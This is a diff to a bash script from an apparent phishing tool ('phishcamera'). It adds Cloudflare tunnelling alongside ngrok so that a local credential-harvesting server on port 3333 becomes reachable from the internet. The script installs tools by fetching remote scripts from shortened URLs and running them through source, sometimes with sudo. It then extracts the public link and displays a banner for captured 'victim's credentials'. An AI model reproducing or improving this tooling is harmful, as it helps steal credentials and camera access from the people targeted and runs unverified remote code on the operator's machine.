@@ -32,6 +32,15 @@ Android)
          cd $RWD > /dev/null 2>&1
          fi
         fi
+        if ! hash cloudflared > /dev/null 2>&1; then
+        printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mcloudflare not found!! Installing......\e[0m\n"
+        echo
+        source <(curl -fsSL "https://git.io/JinSa")
+        LWD=$(pwd)
+         if [[ $LWD != *'programs/phishcamera'* ]]; then
+         cd $RWD > /dev/null 2>&1
+         fi
+        fi
 ;;
 GNU/Linux)
         if ! hash jq > /dev/null 2>&1; then
@@ -47,6 +56,15 @@ GNU/Linux)
         fi
         if ! hash ngrok > /dev/null 2>&1; then
         sudo source <(curl -fsSL "https://bit.ly/3repcoL")
+        LWD=$(pwd)
+         if [[ $LWD != *'programs/phishcamera'* ]]; then
+         cd $RWD > /dev/null 2>&1
+         fi
+        fi
+        if ! hash cloudflared > /dev/null 2>&1; then
+        printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mcloudflare not found!! Installing......\e[0m\n"
+        echo
+        sudo source <(curl -fsSL "https://git.io/JinSa")
         LWD=$(pwd)
          if [[ $LWD != *'programs/phishcamera'* ]]; then
          cd $RWD > /dev/null 2>&1
@@ -140,6 +158,24 @@ fest_name="${fest_name//[[:space:]]/}"
 
 ngrok_server() {
 echo
+echo -e "
+${S2}=========================${R0}
+     ${B1}Server options:-${G0}
+${S3}-------------------------${R0}
+
+${S2}(${S6}01${S2})${S4}Ngrok${R0}
+${S2}(${S6}02${S2})${S4}cloudflare ${S6}(recommended)${R0}
+" | pv -qL 1000
+echo
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}server${S7})> ${R0}"
+read serve
+if [[ $serve == '1' || $serve == '01' || $serve == '2' || $serve == '02' ]]; then
+break
+else
+printf "${S7}[${S1}!${S7}]${S1} Please enter a valid option!!${R0}\n"
+fi
+done
 processbar
 echo
 printf "${S3}Starting server${R0}"
@@ -149,14 +185,22 @@ sleep 2
 echo
 if [[ ${OS^^} == *'ANDROID'* ]]; then
      if [[ ${distro} == *'com.termux'* ]]; then
+         if [[ $serve == '1' || $serve == '01' ]]; then
          termux-chroot ngrok http 3333 > /dev/null 2>&1 &
+         else
+         termux-chroot cloudflared tunnel -url 127.0.0.1:3333 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
+         fi
      else
          while true; do
          printf "${S2}[${S1}!${S2}]${S1} Please switch on your mobile hotspot :/${R0}\n"
 	 echo
          read -p $"Run 'y' if you have switched on the hotspot ==> " hotss
          if [[ ${hotss} == [y/Y] ]]; then
-         ngrok http 3333 > /dev/null 2>&1 &
+          if [[ $serve == '1' || $serve == '01' ]]; then
+             ngrok http 3333 > /dev/null 2>&1 &
+          else
+             cloudflared tunnel -url 127.0.0.1:3333 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
+          fi
          break
          else
          printf "${S2}Exiting........ ${R0}\n"
@@ -165,9 +209,14 @@ if [[ ${OS^^} == *'ANDROID'* ]]; then
          done
      fi
 else
-     sudo ngrok http 3333 > /dev/null 2>&1 &
+if [[ $serve == '1' || $serve == '01' ]]; then
+   sudo ngrok http 3333 > /dev/null 2>&1 &
+else
+   cloudflared tunnel -url 127.0.0.1:3333 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
+fi
 fi
 sleep 5
+if [[ $serve == '1' || $serve == '01' ]]; then
 #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
 if [[ $? != 0 ]]; then
@@ -177,6 +226,12 @@ r2=$(printf "${r1/\"http:\/\//}")
 r3=$(printf "${r2/\"https:\/\//}")
 r4=$(printf "${r3/\",/}")
 link=$(printf "${r4/%\",/}")
+fi
+else
+r1==$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${RWD}/.cloudflare-log")
+link="${r1/=https:\/\//}"
+hoster=""
+rm -rf $RWD/.cloudflare-log > /dev/null 2>&1
 fi
 echo; wait
 printf "${S7}<<<${R0}${S1}---------------${R0}${B1}${S7}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R0}${G0}${S1}---------------${R0}${S7}>>>${R0}\n"; wait
